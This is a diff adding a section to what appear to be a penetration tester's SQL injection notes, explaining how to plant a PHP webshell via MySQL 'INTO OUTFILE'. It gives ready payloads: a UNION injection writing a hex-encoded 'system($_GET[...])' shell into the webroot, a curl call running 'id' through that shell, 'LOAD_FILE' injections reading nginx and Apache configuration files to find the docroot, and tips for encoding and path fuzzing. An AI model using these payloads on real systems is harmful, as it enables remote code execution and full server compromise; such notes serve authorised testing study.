@@ -135,3 +135,35 @@ Caveat: `||` is OR on default MySQL but string-concat on Postgres/Oracle
 (PIPES_AS_CONCAT); re-check the operator semantics per backend before reading the oracle.
 
 <!-- promoted-slug: dup-check-or-expansion-oracle -->
+
+## INTO OUTFILE: find the webroot, write a quote-free shell
+
+A plain `INTO OUTFILE` webshell payload breaks in most real injection contexts: the PHP shell
+contains both quote characters, and the payload itself already sits inside quotes. Write it as a
+hex blob instead, so no quote has to survive the context:
+
+```sql
+-- <?php system($_GET["cmd"]); ?> as a hex literal
+' UNION SELECT 1,2,0x3c3f7068702073797374656d28245f4745545b22636d64225d293b203f3e,4
+  INTO OUTFILE '/var/www/html/shell.php'-- -
+```
+
+Verify: `curl -sk "https://TARGET/shell.php?cmd=id"`. Long or binary content: build it with
+`FROM_BASE64("...")`. Note `INTO OUTFILE` writes the ENTIRE union row, numbers and all; pad the
+junk columns with empty strings `''` for a clean file.
+
+The write needs the real docroot, which is usually not `/var/www/html` on a configured box.
+Read the server config through `LOAD_FILE` first:
+
+```sql
+' UNION SELECT 1,LOAD_FILE('/etc/nginx/sites-enabled/default'),3,4-- -
+' UNION SELECT 1,LOAD_FILE('/etc/nginx/nginx.conf'),3,4-- -
+' UNION SELECT 1,LOAD_FILE('/etc/apache2/apache2.conf'),3,4-- -
+-- Windows/IIS: %WinDir%\System32\Inetsrv\Config\applicationHost.config
+```
+
+Fallbacks: fuzz candidate webroots with the SecLists default-web-root-directory wordlists
+(Linux and Windows variants), or infer the path from reflected server errors. A `secure_file_priv`
+of NULL kills this whole lane before you start; see [[sql-injection]] for the precheck.
+
+<!-- promoted-slug: outfile-webroot-webshell -->
